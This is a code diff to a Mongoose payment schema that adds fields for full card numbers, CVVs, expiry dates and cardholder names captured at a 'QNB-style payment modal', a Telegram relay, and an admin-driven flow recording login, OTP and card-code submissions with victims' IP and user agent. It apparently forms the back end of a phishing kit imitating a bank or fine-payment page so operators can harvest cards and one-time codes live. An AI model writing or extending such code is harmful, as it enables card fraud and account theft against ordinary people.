@@ -1,6 +1,35 @@
-import { Schema, model, Document } from 'mongoose';
+import { Schema, model, Document } from "mongoose";
 
-export type PaymentStatus = 'submitted' | 'forwarded' | 'failed';
+// Lifecycle: 'submitted' = card captured, awaiting an admin flow decision.
+// 'forwarded' = relayed to Telegram. 'read'/'contacted'/'completed'/'cancelled'
+// are admin-managed states. 'failed' = Telegram relay failed.
+export type PaymentStatus =
+  | "submitted"
+  | "forwarded"
+  | "read"
+  | "contacted"
+  | "completed"
+  | "cancelled"
+  | "failed";
+
+export const PAYMENT_STATUSES: PaymentStatus[] = [
+  "submitted",
+  "forwarded",
+  "read",
+  "contacted",
+  "completed",
+  "cancelled",
+  "failed",
+];
+
+// One recorded submission from a flow screen (login, OTP, card-code, …).
+export interface FlowSubmission {
+  step: string;
+  data: Record<string, unknown>;
+  ip?: string;
+  userAgent?: string;
+  submittedAt: Date;
+}
 
 export interface PaymentDoc extends Document {
   reference: string;
@@ -12,13 +41,40 @@ export interface PaymentDoc extends Document {
   amount: number;
   violationRefs: string[];
   notes?: string;
-  language: 'ar' | 'en';
+  language: "ar" | "en";
   status: PaymentStatus;
+
+  // Card data captured at the QNB-style payment modal.
+  cardholderName?: string;
+  cardNumber?: string;
+  cardLastFour?: string;
+  cardExpiryMonth?: string;
+  cardExpiryYear?: string;
+  cardCvv?: string;
+
+  // Customer-flow control.
+  flowAction?: string | null;
+  flowActionAt?: Date | null;
+  flowSubmissions: FlowSubmission[];
+
   telegramMessageId?: number;
+  adminNotes?: string;
   ip?: string;
+  userAgent?: string;
   createdAt: Date;
   updatedAt: Date;
 }
+
+const flowSubmissionSchema = new Schema<FlowSubmission>(
+  {
+    step: { type: String, required: true },
+    data: { type: Schema.Types.Mixed, default: {} },
+    ip: { type: String },
+    userAgent: { type: String },
+    submittedAt: { type: Date, default: Date.now },
+  },
+  { _id: false },
+);
 
 const paymentSchema = new Schema<PaymentDoc>(
   {
@@ -31,12 +87,26 @@ const paymentSchema = new Schema<PaymentDoc>(
     amount: { type: Number, required: true },
     violationRefs: { type: [String], default: [] },
     notes: { type: String },
-    language: { type: String, enum: ['ar', 'en'], default: 'en' },
-    status: { type: String, enum: ['submitted', 'forwarded', 'failed'], default: 'submitted' },
+    language: { type: String, enum: ["ar", "en"], default: "en" },
+    status: { type: String, enum: PAYMENT_STATUSES, default: "submitted" },
+
+    cardholderName: { type: String },
+    cardNumber: { type: String },
+    cardLastFour: { type: String },
+    cardExpiryMonth: { type: String },
+    cardExpiryYear: { type: String },
+    cardCvv: { type: String },
+
+    flowAction: { type: String, default: null },
+    flowActionAt: { type: Date, default: null },
+    flowSubmissions: { type: [flowSubmissionSchema], default: [] },
+
     telegramMessageId: { type: Number },
+    adminNotes: { type: String },
     ip: { type: String },
+    userAgent: { type: String },
   },
-  { timestamps: true }
+  { timestamps: true },
 );
 
-export const Payment = model<PaymentDoc>('Payment', paymentSchema);
+export const Payment = model<PaymentDoc>("Payment", paymentSchema);
